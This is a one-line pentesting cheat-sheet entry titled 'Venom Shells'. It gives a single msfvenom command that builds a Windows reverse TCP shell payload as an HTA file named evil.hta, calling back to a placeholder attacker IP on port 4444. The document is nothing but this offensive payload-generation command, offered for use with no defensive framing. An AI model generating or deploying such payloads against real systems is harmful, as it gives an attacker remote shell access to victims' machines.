###### Venom Shells

hta, VBS, B64 encoded reverse shell
``` msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f hta-psh evil.hta ```


